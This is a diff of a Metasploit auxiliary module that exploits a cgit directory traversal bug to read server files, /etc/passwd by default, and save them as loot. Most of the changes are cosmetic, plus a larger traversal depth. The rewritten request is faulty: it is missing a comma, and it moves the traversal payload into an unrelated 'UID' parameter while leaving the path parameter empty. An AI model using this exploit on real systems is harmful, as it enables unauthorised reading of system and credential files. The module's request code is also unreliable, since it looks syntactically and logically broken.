@@ -10,10 +10,10 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'        => 'Directory traversal in cgit',
+      'Name'        => 'cgit Directory Traversal',
       'Description' => %q{
         This module exploits a directory traversal vulnerability which
-        exits in cgit < 1.2.1 cgit_clone_objects(), reachable when the
+        exists in cgit < 1.2.1 cgit_clone_objects(), reachable when the
         configuration flag enable-http-clone is set to 1 (default)
       },
       'References'  =>
@@ -31,11 +31,11 @@ class MetasploitModule < Msf::Auxiliary
       'License'     => MSF_LICENSE
     ))
 
-  register_options(
+    register_options(
       [
         Opt::RPORT(80),
         OptString.new('FILEPATH', [true, "The path to the file to read", '/etc/passwd']),
-        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 6 ])
+        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal', 10 ])
       ])
   end
 
@@ -45,13 +45,16 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => "/cgit/cgit.cgi/git/objects/?path=#{traversal}"
+      'uri'    => '/cgit/cgit.cgi/git/objects/?path='
+      'vars_get' => {
+        'UID' => traversal
+      }
     })
 
     unless res && res.code == 200
       print_error('Nothing was downloaded')
       return
-   end
+    end
 
     vprint_good("#{peer} - #{res.body}")
     path = store_loot(
